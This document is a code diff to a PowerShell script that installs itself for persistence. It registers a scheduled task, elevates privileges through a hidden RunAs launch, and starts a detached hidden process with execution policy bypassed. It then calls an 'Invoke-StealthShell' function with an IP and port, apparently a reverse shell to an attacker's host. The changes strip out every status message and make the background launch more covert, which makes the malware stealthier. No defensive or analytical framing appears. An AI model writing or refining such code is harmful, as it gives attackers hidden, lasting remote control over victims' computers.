@@ -15,16 +15,13 @@ function Install-Persistence {
     if (-not (Test-Path $InstallDir)) {
         try {
             New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
-            Write-Output "Created installation directory: $InstallDir"
         } catch {
-            Write-Output "Failed to create directory: $($_.Exception.Message)"
             return $false
         }
     }
     
     # Check if already installed
     if (Test-Path $InstallPath) {
-        Write-Output "Script already installed at $InstallPath"
         return $true
     }
     
@@ -39,12 +36,10 @@ function Install-Persistence {
             
             $process = Start-Process PowerShell.exe -ArgumentList "-EncodedCommand $encodedCommand" -Verb RunAs -PassThru -WindowStyle Hidden
             if ($process.Id) {
-                Write-Output "Elevating privileges for installation..."
-                Start-Sleep -Seconds 5
+                Start-Sleep -Seconds 3
                 exit 0
             }
         } catch {
-            Write-Output "Admin rights required for persistence installation."
             return $false
         }
     }
@@ -53,9 +48,7 @@ function Install-Persistence {
     try {
         $selfContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
         Set-Content -Path $InstallPath -Value $selfContent -Force
-        Write-Output "Script installed to $InstallPath"
     } catch {
-        Write-Output "Failed to install script: $($_.Exception.Message)"
         return $false
     }
     
@@ -68,10 +61,8 @@ function Install-Persistence {
         
         # Register the task
         Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
-        Write-Output "Persistence installed as scheduled task: $TaskName"
         return $true
     } catch {
-        Write-Output "Failed to create scheduled task: $($_.Exception.Message)"
         return $false
     }
 }
@@ -147,14 +138,28 @@ try {
     if (-not $isInstalled) {
         $installed = Install-Persistence
         if ($installed) {
-            # If we just installed, run from installed location
+            # If we just installed, launch detached process and exit
             if (Test-Path $InstallPath) {
-                Start-Process PowerShell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`"" -WindowStyle Hidden
+                # Start completely detached process that survives PowerShell closure
+                $psi = New-Object System.Diagnostics.ProcessStartInfo
+                $psi.FileName = "PowerShell.exe"
+                $psi.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`""
+                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+                $psi.CreateNoWindow = $true
+                $psi.UseShellExecute = $false
+                
+                $process = New-Object System.Diagnostics.Process
+                $process.StartInfo = $psi
+                $process.Start() | Out-Null
+                
+                # Immediately detach from parent process
+                $process.Dispose()
                 exit 0
             }
         }
     }
     
+    # If we reach here, we're running from the installed location
     # Execution Guard - Ensure single instance
     $MutexName = "Global\RustCatShellMutex"
     try {
@@ -165,7 +170,7 @@ try {
     }
     
     if ($HasMutex) {
-        # Launch the shell
+        # Launch the shell - this runs in the background independently
         Invoke-StealthShell -IP $IP -Port $Port -MaxRetries $MaxRetries -RetryDelay $RetryDelay
     } else {
         exit 0
